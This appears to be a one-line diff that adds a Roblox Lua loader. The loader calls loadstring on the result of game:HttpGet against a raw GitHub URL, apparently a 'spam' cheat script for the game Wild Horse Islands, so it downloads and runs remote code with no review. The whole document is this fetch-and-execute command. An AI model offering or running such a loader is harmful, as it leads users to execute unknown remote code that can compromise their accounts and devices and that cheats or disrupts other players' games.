@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/wild-horse-islands-spam4-ey37g9klgz8q3p.lua"))()
